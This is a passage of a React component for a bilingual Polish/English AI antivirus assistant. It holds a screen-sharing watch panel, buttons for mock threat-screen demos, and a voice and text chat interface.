                        <span className="w-2 h-2 rounded-full bg-emerald-400 animate-ping" />
                        <span>WIESZKA AI LIVE VOICE & VISION STREAM</span>
                      </div>
                      <div className="px-2 py-0.5 rounded bg-black/60 text-[10px] font-mono text-slate-400 border border-slate-800">
                        FPS: 30 • AUTONOMOUS WATCH
                      </div>
                    </div>

                    <div className="flex items-center justify-between text-[10px] font-mono text-slate-500">
                      <span>{getText(currentLang, `Częstotliwość inspekcji: co ${liveWatchIntervalSec}s`, `Inspection interval: every ${liveWatchIntervalSec}s`)}</span>
                      <span>{getText(currentLang, 'STATUS: GŁOS WŁĄCZONY', 'STATUS: VOICE ENABLED')}</span>
                    </div>
                  </div>
                </div>
              ) : currentSnapshot ? (
                <div className="relative w-full h-full p-2">
                  <img
                    src={currentSnapshot}
                    alt="Przechwycony ekran"
                    className="w-full h-auto max-h-[420px] object-contain rounded-xl mx-auto border border-slate-800"
                  />
                  <div className="absolute top-4 left-4 px-3 py-1 rounded-lg bg-[#121217]/80 backdrop-blur-md border border-indigo-500/40 text-[10px] font-mono text-indigo-300 flex items-center gap-1.5">
                    <Check className="w-3 h-3 text-emerald-400" />
                    <span>{getText(currentLang, 'Widok ekranu pod stałą obserwacją Wieszka AI', 'Screen under continuous Wieszka AI monitoring')}</span>
                  </div>
                </div>
              ) : (
                <div className="p-8 text-center space-y-4 max-w-md mx-auto">
                  <div className="w-16 h-16 rounded-3xl bg-indigo-600/10 border border-indigo-500/30 flex items-center justify-center mx-auto text-indigo-400">
                    <MonitorUp className="w-8 h-8" />
                  </div>
                  <div className="space-y-1">
                    <h4 className="text-sm font-bold text-white">
                      {getText(currentLang, 'Udostępnij ekran swojemu antywirusowi Wieszka', 'Share your screen with Wieszka Antivirus')}
                    </h4>
                    <p className="text-xs text-slate-400 leading-relaxed">
                      {getText(
                        currentLang,
                        'Kliknij przycisk poniżej, aby Wieszka AI na bieżąco widział Twój ekran i sam mówił do Ciebie, gdy tylko pojawi się wirus lub błąd.',
                        'Click the button below to allow Wieszka AI to watch your screen in real time and automatically warn you about threats.'
                      )}
                    </p>
                  </div>
                  <div className="flex flex-wrap items-center justify-center gap-2 pt-2">
                    <button
                      onClick={startScreenShare}
                      className="px-4 py-2 rounded-xl text-xs font-bold bg-indigo-600 hover:bg-indigo-500 text-white transition flex items-center gap-1.5 shadow-md"
                    >
                      <MonitorUp className="w-4 h-4" />
                      <span>{getText(currentLang, 'Rozpocznij udostępnianie', 'Start Screen Sharing')}</span>
                    </button>
                    <button
                      onClick={() => fileInputRef.current?.click()}
                      className="px-3.5 py-2 rounded-xl text-xs font-semibold bg-[#1A1A21] hover:bg-slate-800 text-slate-300 border border-slate-800 transition flex items-center gap-1.5"
                    >
                      <Upload className="w-4 h-4" />
                      <span>{getText(currentLang, 'Wgraj zrzut', 'Upload screenshot')}</span>
                    </button>
                  </div>
                </div>
              )}
            </div>

            {/* Test Infected Scenarios & Options Sidebar */}
            <div className="lg:col-span-4 space-y-4 flex flex-col justify-between">
              <div className="space-y-3">
                <span className="text-[11px] font-bold text-slate-400 uppercase tracking-wider flex items-center gap-1.5 font-mono">
                  <Sparkles className="w-3.5 h-3.5 text-indigo-400" />
                  {getText(currentLang, 'Testuj na spreparowanych ekranach (AI od razu mówi na głos!):', 'Test with mock threat screens (AI speaks instantly!):')}
                </span>
                <p className="text-[11px] text-slate-500 leading-snug">
                  {getText(
                    currentLang,
                    'Kliknij jeden ze scenariuszy. Wieszka AI automatycznie go zauważy i sam powie Ci na głos, co to za zagrożenie i jak je zneutralizować:',
                    'Click one of the scenarios. Wieszka AI will automatically detect it and guide you out loud on how to neutralize it:'
                  )}
                </p>

                <div className="space-y-2">
                  <button
                    onClick={() => loadMockInfectedScreen('tech_scam')}
                    className="w-full text-left p-3 rounded-xl bg-[#1A1A21] hover:bg-slate-800 border border-slate-800 hover:border-indigo-500/40 transition flex items-center justify-between group"
                  >
                    <div className="space-y-0.5">
                      <div className="text-xs font-bold text-slate-200 group-hover:text-indigo-300 flex items-center gap-1.5">
                        <AlertTriangle className="w-3.5 h-3.5 text-rose-400" />
                        <span>{getText(currentLang, 'Fałszywy alert Tech Support', 'Fake Tech Support Alert')}</span>
                      </div>
                      <span className="text-[10px] text-slate-500 block font-mono">{getText(currentLang, 'Blokada "Zadzwoń do Microsoftu"', 'Scam lock "Call Microsoft"')}</span>
                    </div>
                    <span className="text-xs text-indigo-400 font-mono font-bold">{getText(currentLang, 'Sprawdź na głos →', 'Check out loud →')}</span>
                  </button>

                  <button
                    onClick={() => loadMockInfectedScreen('ransomware')}
                    className="w-full text-left p-3 rounded-xl bg-[#1A1A21] hover:bg-slate-800 border border-slate-800 hover:border-rose-500/40 transition flex items-center justify-between group"
                  >
                    <div className="space-y-0.5">
                      <div className="text-xs font-bold text-slate-200 group-hover:text-rose-300 flex items-center gap-1.5">
                        <KeyRound className="w-3.5 h-3.5 text-rose-400" />
                        <span>{getText(currentLang, 'Ekran blokady Ransomware', 'Ransomware Lock Screen')}</span>
                      </div>
                      <span className="text-[10px] text-slate-500 block font-mono">{getText(currentLang, 'Żądanie okupu Bitcoin', 'Bitcoin Ransom Demand')}</span>
                    </div>
                    <span className="text-xs text-rose-400 font-mono font-bold">{getText(currentLang, 'Sprawdź na głos →', 'Check out loud →')}</span>
                  </button>

                  <button
                    onClick={() => loadMockInfectedScreen('powershell_cmd')}
                    className="w-full text-left p-3 rounded-xl bg-[#1A1A21] hover:bg-slate-800 border border-slate-800 hover:border-amber-500/40 transition flex items-center justify-between group"
                  >
                    <div className="space-y-0.5">
                      <div className="text-xs font-bold text-slate-200 group-hover:text-amber-300 flex items-center gap-1.5">
                        <Terminal className="w-3.5 h-3.5 text-amber-400" />
                        <span>{getText(currentLang, 'Konsola PowerShell Trojan', 'PowerShell Trojan Console')}</span>
                      </div>
                      <span className="text-[10px] text-slate-500 block font-mono">{getText(currentLang, 'Pobieranie szkodliwego payloadu', 'Downloading malicious payload')}</span>
                    </div>
                    <span className="text-xs text-amber-400 font-mono font-bold">{getText(currentLang, 'Sprawdź na głos →', 'Check out loud →')}</span>
                  </button>
                </div>
              </div>

              {/* Watcher Configuration */}
              <div className="p-3.5 rounded-2xl bg-[#17141A] border border-slate-800 space-y-2">
                <div className="flex items-center justify-between text-xs text-slate-300">
                  <span className="font-medium">{getText(currentLang, 'Częstotliwość inspekcji na żywo:', 'Live inspection interval:')}</span>
                  <span className="font-mono font-bold text-indigo-400">
                    {getText(currentLang, `co ${liveWatchIntervalSec}s`, `every ${liveWatchIntervalSec}s`)} {liveWatchIntervalSec === 1 ? getText(currentLang, '(Ekspresowa 1s)', '(Fast 1s)') : ''}
                  </span>
                </div>
                <div className="flex items-center space-x-2 pt-1">
                  {[1, 2, 3, 5].map((sec) => (
                    <button
                      key={sec}
                      onClick={() => setLiveWatchIntervalSec(sec)}
                      className={`flex-1 py-1.5 rounded-lg text-xs font-mono font-bold transition ${
                        liveWatchIntervalSec === sec
                          ? 'bg-indigo-600 text-white shadow-sm shadow-indigo-900/50'
                          : 'bg-[#121217] text-slate-400 hover:text-white border border-slate-800'
                      }`}
                    >
                      {sec}s
                    </button>
                  ))}
                </div>
                <p className="text-[10px] text-slate-500 leading-tight pt-1">
                  {getText(
                    currentLang,
                    'Tryb cichej obserwacji: Wieszka AI bada pulpit co 1 sekundę, a odzywa się głosem wyłącznie w momencie wykrycia zagrożenia lub ataku.',
                    'Quiet watch mode: Wieszka AI inspects the screen every 1 second and speaks only when threats or attacks are detected.'
                  )}
                </p>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* Preset Action Prompt Cards */}
      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4">
        {PRESET_PROMPTS.map((item, idx) => {
          const IconComp = item.icon;
          return (
            <button
              key={idx}
              onClick={() => {
                if (item.requiresScreen && !isScreenSharing && !currentSnapshot) {
                  setShowScreenPanel(true);
                  startScreenShare();
                } else {
                  handleSendMessage(item.prompt);
                }
              }}
              disabled={isLoading}
              className="bg-[#121217] hover:bg-[#1A1A21] p-4 rounded-2xl border border-slate-800 hover:border-indigo-500/40 text-left transition space-y-2 group shadow-sm flex flex-col justify-between"
            >
              <div className="space-y-2">
                <div className="flex items-center justify-between">
                  <div className="p-2 rounded-xl bg-indigo-600/10 text-indigo-400 group-hover:bg-indigo-600/20 transition">
                    <IconComp className="w-4 h-4" />
                  </div>
                  <Zap className="w-3.5 h-3.5 text-slate-600 group-hover:text-indigo-400 transition" />
                </div>
                <h4 className="text-xs font-bold text-white group-hover:text-indigo-300 transition">
                  {item.title}
                </h4>
                <p className="text-[11px] text-slate-400 leading-snug line-clamp-2">
                  {item.description}
                </p>
              </div>
              <span className="text-[10px] font-mono text-indigo-400 pt-2 block font-semibold flex items-center gap-1">
                <Volume2 className="w-3 h-3" />
                Zapytaj na głos →
              </span>
            </button>
          );
        })}
      </div>

      {/* Chat Container (Live Speech & Transcript Stream) */}
      <div className="bg-[#121217] border border-slate-800 rounded-3xl p-6 flex flex-col h-[580px] shadow-2xl justify-between space-y-4">
        {/* Messages Stream */}
        <div className="flex-1 overflow-y-auto space-y-4 pr-2 scrollbar-thin">
          {messages.map((msg) => (
            <div
              key={msg.id}
              className={`flex items-start space-x-3 ${
                msg.sender === 'user' ? 'justify-end' : 'justify-start'
              }`}
            >
              {msg.sender === 'ai' && (
                <div className="w-9 h-9 rounded-2xl bg-indigo-600/20 border border-indigo-500/40 flex items-center justify-center shrink-0 mt-0.5 shadow-md shadow-indigo-950/30">
                  <Bot className="w-4.5 h-4.5 text-indigo-400" />
                </div>
              )}

              <div
                className={`max-w-[85%] sm:max-w-[80%] rounded-2xl p-4 text-xs leading-relaxed space-y-2 relative group shadow-sm ${
                  msg.sender === 'user'
                    ? 'bg-indigo-600 text-white rounded-tr-none'
                    : 'bg-[#1A1A21] text-slate-200 border border-slate-800/80 rounded-tl-none'
                }`}
              >
                <div className="flex items-center justify-between text-[10px] opacity-75 mb-1 font-mono">
                  <div className="flex items-center space-x-2">
                    <span className="font-bold">
                      {msg.sender === 'user' ? getText(currentLang, 'Użytkownik (Głos / Tekst)', 'User (Voice / Text)') : getText(currentLang, 'Wieszka AI (Głos & Ekran)', 'Wieszka AI (Voice & Screen)')}
                    </span>
                    {msg.sender === 'ai' && (
                      <span className="bg-emerald-500/20 text-emerald-400 px-1.5 py-0.2 rounded text-[9px] font-bold flex items-center gap-1">
                        <Volume2 className="w-2.5 h-2.5" />
                        {getText(currentLang, 'GŁOS', 'VOICE')}
                      </span>
                    )}
                    {msg.category === 'live_sentinel' && (
                      <span className="bg-rose-500/20 text-rose-300 px-1.5 py-0.2 rounded text-[9px] font-mono font-bold flex items-center gap-1 animate-pulse">
                        <Radio className="w-2.5 h-2.5" />
                        {getText(currentLang, 'AUTONOMICZNA OBSERWACJA EKRANU', 'AUTONOMOUS SCREEN WATCH')}
                      </span>
                    )}
                    {msg.category === 'screen_vision' && (
                      <span className="bg-indigo-500/20 text-indigo-300 px-1.5 py-0.2 rounded text-[9px] font-mono font-bold flex items-center gap-1">
                        <Eye className="w-2.5 h-2.5" />
                        AI VISION
                      </span>
                    )}
                  </div>
                  <span>{msg.timestamp}</span>
                </div>

                {/* Attached Screen Snapshot thumbnail if present */}
                {msg.screenSnapshot && (
                  <div className="my-2 rounded-xl overflow-hidden border border-indigo-400/30 bg-black/40 p-1 max-w-sm">
                    <img
                      src={msg.screenSnapshot}
                      alt={getText(currentLang, 'Załączony kadr ekranu', 'Attached screen snapshot')}
                      className="w-full h-auto max-h-48 object-cover rounded-lg"
                    />
                    <div className="px-2 py-1 flex items-center justify-between text-[10px] font-mono text-slate-300">
                      <span>{getText(currentLang, 'Kadr zbadany na żywo przez Wieszka AI', 'Frame analyzed live by Wieszka AI')}</span>
                      <Eye className="w-3 h-3 text-indigo-400" />
                    </div>
                  </div>
                )}

                <div className="whitespace-pre-wrap font-sans text-slate-100 text-[13px] leading-relaxed">
                  {msg.text}
                </div>

                {msg.sender === 'ai' && (
                  <div className="pt-2 flex items-center justify-between border-t border-slate-800/60 mt-3">
                    <div className="flex items-center space-x-2">
                      <button
                        onClick={() => speakText(msg.text)}
                        className={`text-[11px] flex items-center space-x-1 font-mono px-2.5 py-1 rounded-lg transition ${
                          isSpeaking && activeSpeechText.includes(msg.text.slice(0, 20))
                            ? 'bg-indigo-600 text-white animate-pulse'
                            : 'text-slate-400 hover:text-indigo-300 hover:bg-slate-800'
                        }`}
                        title={getText(currentLang, 'Odsłuchaj odpowiedź na głos głosem Wieszka AI', 'Listen to response spoken out loud')}
                      >
                        <Volume2 className="w-3.5 h-3.5" />
                        <span>{getText(currentLang, 'Powtórz na głos', 'Speak aloud')}</span>
                      </button>
                    </div>

                    <button
                      onClick={() => handleCopyText(msg.id, msg.text)}
                      className="text-[10px] text-slate-400 hover:text-white flex items-center space-x-1 font-mono transition px-2 py-1 rounded-lg hover:bg-slate-800"
                    >
                      {copiedId === msg.id ? (
                        <>
                          <Check className="w-3 h-3 text-emerald-400" />
                          <span className="text-emerald-400">{getText(currentLang, 'Skopiowano', 'Copied')}</span>
                        </>
                      ) : (
                        <>
                          <Copy className="w-3 h-3" />
                          <span>{getText(currentLang, 'Kopiuj', 'Copy')}</span>
                        </>
                      )}
                    </button>
                  </div>
                )}
              </div>

              {msg.sender === 'user' && (
                <div className="w-9 h-9 rounded-2xl bg-slate-800 border border-slate-700 flex items-center justify-center shrink-0 mt-0.5">
                  <User className="w-4.5 h-4.5 text-slate-300" />
                </div>
              )}
            </div>
          ))}

          {isLoading && (
            <div className="flex items-start space-x-3 justify-start">
              <div className="w-9 h-9 rounded-2xl bg-indigo-600/20 border border-indigo-500/40 flex items-center justify-center shrink-0 mt-0.5">
                <Bot className="w-4.5 h-4.5 text-indigo-400 animate-pulse" />
              </div>
              <div className="bg-[#1A1A21] border border-slate-800 rounded-2xl p-4 text-xs text-slate-300 flex items-center space-x-3 shadow-md">
                <Loader2 className="w-4 h-4 animate-spin text-indigo-400" />
                <div>
                  <p className="font-bold text-slate-200">
                    {getText(currentLang, 'Wieszka AI przetwarza obraz i przygotowuje odpowiedź głosową...', 'Wieszka AI is processing vision and preparing voice response...')}
                  </p>
                  <p className="text-[11px] text-slate-400">
                    {getText(currentLang, 'Zaraz usłyszysz odpowiedź na głos z głośników.', 'You will hear the response spoken through your speakers shortly.')}
                  </p>
                </div>
              </div>
            </div>
          )}

          <div ref={messagesEndRef} />
        </div>

        {/* Bottom Bar with Continuous Voice & Screen Sharing Controls */}
        <div className="pt-3 border-t border-slate-800/80 space-y-2">
          {/* Hands-Free Live Voice Listening Feedback & 1.5s Auto-Send Countdown */}
          {isHandsFreeVoice && isListening && !isSpeaking && (
            <div className="flex items-center justify-between px-4 py-2 bg-emerald-500/10 border border-emerald-500/30 rounded-xl text-xs text-emerald-300">
              <div className="flex items-center space-x-2.5 min-w-0">
                <span className="w-2.5 h-2.5 rounded-full bg-emerald-400 animate-ping shrink-0" />
                <div className="truncate">
                  {interimTranscript ? (
                    <span className="font-semibold">
                      {getText(currentLang, 'Słucham:', 'Listening:')} <span className="text-white font-normal">"{interimTranscript}"</span>
                    </span>
                  ) : (
                    <span className="font-medium">
                      {getText(currentLang, 'Ciągły nasłuch aktywny: Mów do mikrofonu (Wieszka AI odpowie na głos)', 'Continuous listening active: Speak into mic (Wieszka AI will reply out loud)')}
                    </span>
                  )}
                </div>
              </div>
              <div className="flex items-center space-x-3 shrink-0 ml-2">
                {autoSendCountdown !== null && autoSendCountdown > 0 && (
                  <span className="px-2 py-0.5 rounded-md bg-indigo-500/20 text-indigo-300 border border-indigo-500/40 text-[11px] font-mono animate-pulse">
                    {getText(currentLang, `Wysyłanie za ${autoSendCountdown.toFixed(1)}s`, `Sending in ${autoSendCountdown.toFixed(1)}s`)}
                  </span>
                )}
                <button
                  onClick={toggleSpeechRecognition}
                  className="text-xs text-emerald-400 hover:text-white underline font-mono"
                >
                  {getText(currentLang, 'Wyłącz nasłuch', 'Disable listening')}
                </button>
              </div>
            </div>
          )}

          <form
            onSubmit={(e) => {
              e.preventDefault();
              handleSendMessage();
            }}
            className="flex items-center space-x-2"
          >
            {/* Quick Screen Share Button in Input */}
            <button
              type="button"
              onClick={() => {
                if (isScreenSharing) {
                  stopScreenShare();
                } else {
                  startScreenShare();
                }
              }}
              title={isScreenSharing ? getText(currentLang, 'Zatrzymaj udostępnianie ekranu', 'Stop screen sharing') : getText(currentLang, 'Udostępnij ekran dla Wieszka AI', 'Share screen with Wieszka AI')}
              className={`p-3.5 rounded-2xl transition flex items-center justify-center shrink-0 ${
                isScreenSharing
                  ? 'bg-rose-600 text-white animate-pulse shadow-md shadow-rose-950/40'
                  : 'bg-[#1A1A21] hover:bg-slate-800 text-indigo-400 border border-slate-800'
              }`}
            >
              {isScreenSharing ? <MonitorOff className="w-4.5 h-4.5" /> : <MonitorUp className="w-4.5 h-4.5" />}
            </button>

            {/* Hands-Free / Voice Mic Button */}
            {speechSupported && (
              <button
                type="button"
                onClick={toggleSpeechRecognition}
                title={isListening ? getText(currentLang, 'Wyłącz nasłuch mikrofonu', 'Disable microphone') : getText(currentLang, 'Włącz nasłuch mikrofonu (mów do Wieszka AI)', 'Enable microphone')}
                className={`p-3.5 rounded-2xl transition flex items-center justify-center shrink-0 ${
                  isListening
                    ? 'bg-emerald-600 text-white shadow-lg shadow-emerald-900/40 animate-pulse'
                    : 'bg-[#1A1A21] hover:bg-slate-800 text-slate-400 border border-slate-800'
                }`}
              >
                {isListening ? <Mic className="w-4.5 h-4.5 text-white" /> : <MicOff className="w-4.5 h-4.5" />}
              </button>
            )}

            <input
              type="text"
              value={inputMessage}
              onChange={(e) => setInputMessage(e.target.value)}
              placeholder={
                isListening
                  ? getText(currentLang, 'Mów do mikrofonu (Wieszka AI słucha i odpowie głosem)...', 'Speak into microphone (Wieszka AI is listening)...')
                  : isScreenSharing
                  ? getText(currentLang, 'Napisz lub mów (np. "Wieszka, co to za okno na moim ekranie?")...', 'Type or speak (e.g. "Wieszka, what is this window on my screen?")...')
                  : getText(currentLang, 'Mów do mikrofonu lub napisz do Wieszka AI...', 'Speak into mic or type a question for Wieszka AI...')
              }
              disabled={isLoading}
              className="flex-1 bg-[#1A1A21] border border-slate-800 rounded-2xl px-4 py-3.5 text-xs sm:text-sm text-slate-100 placeholder-slate-500 focus:outline-none focus:border-indigo-500 transition"
            />

            <button
              type="submit"
              disabled={isLoading || !inputMessage.trim()}
              className={`px-5 py-3.5 rounded-2xl font-bold text-xs transition flex items-center space-x-2 shrink-0 ${
                isLoading || !inputMessage.trim()
                  ? 'bg-[#1A1A21] text-slate-600 cursor-not-allowed border border-slate-800'
                  : 'bg-indigo-600 hover:bg-indigo-500 text-white shadow-lg shadow-indigo-900/30'
              }`}
            >
              <Send className="w-4 h-4" />
              <span className="hidden sm:inline">{getText(currentLang, 'Wyślij', 'Send')}</span>
            </button>
          </form>

          <div className="flex items-center justify-between text-[10px] text-slate-500 font-mono px-1">
            <span className="flex items-center gap-1.5">
              <AudioLines className="w-3 h-3 text-indigo-400" />
              {isListening ? getText(currentLang, 'Mikrofon aktywny (Wieszka AI słucha Twoich słów)', 'Microphone active (Wieszka AI is listening)') : getText(currentLang, 'Mikrofon wyłączony – kliknij ikonę mikrofonu, aby włączyć rozmowę', 'Microphone off – click mic icon to speak')}
            </span>
            <span className="hidden sm:inline">{getText(currentLang, 'Naciśnij Enter lub kliknij Wyślij', 'Press Enter or click Send')}</span>
          </div>
        </div>
      </div>
    </div>
  );
};
